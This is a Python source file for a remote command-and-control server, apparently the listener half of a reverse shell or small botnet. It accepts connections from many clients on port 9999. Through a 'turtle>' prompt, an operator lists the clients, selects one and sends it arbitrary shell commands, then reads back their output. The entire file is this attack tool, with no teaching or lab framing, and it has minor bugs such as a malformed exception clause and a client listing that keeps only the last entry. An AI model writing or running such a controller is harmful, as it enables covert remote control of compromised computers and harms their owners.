# server

import socket
import sys
import threading
import time
from queue import Queue

NUMBER_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global sock
        host = ""
        port = 9999
        sock = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global sock
        print("Binding the Port: " + str(port))

        sock.bind((host, port))
        sock.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Handling connection from multiple clients and saving to a list
# Closing Previous connections when server.py file is restarted
def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = sock.accept()
            sock.setblocking(1) # prevents timeout

            all_connections.append(conn)
            all_address.append(address)

            print('[CONNECTED] Connection has been established...')
            print(f'Connected to: {all_address[0]}')

        except socket.error()  as e:
            print('[ERROR]',  e)


''' 2nd thread function ~
1. See all the clients
2. Select a client
3. Send command to connected client '''

# Interactive promp for sending commands
# turtle> 
def start_turtle():
    while True:
        cmd = input('turtle> ')

        if cmd == 'list':
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_commands(conn)
            else:
                print('Command not recognized')


# Display all current active connections with the client
def list_connections():
    results = ''

    for item, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(5120)

        except:
            del all_connections[item]
            del all_address[item]
            continue

        results = str(item) + '  ' + str(all_address[item][1]) + '\n'

    print('----- Clients -----' + '\n' + results)


# Selecting a target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '') # target id
        target = int(target)
        conn = all_connections[target]
        print('Connection has been established !' + str(all_address[target][0]))
        print(str(all_address[target][0]) + '>', end="")
        return conn

    except:
        print('Selection not valid !')
        return None


def send_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(5120), "utf-8")
                print()
                print(client_response, end="")

        except:
            print('[ERROR] Error sending command !')
            break


# Create worker thread
def create_workers():
    for _ in range(NUMBER_THREADS):
        thread = threading.Thread(target=work)
        thread.daemon = True
        thread.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()

        if x == 1:
            create_socket()
            bind_socket()
            accepting_connection()

        if x == 2:
            start_turtle() 

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


if __name__ == '__main__':
    create_workers()
    create_jobs()








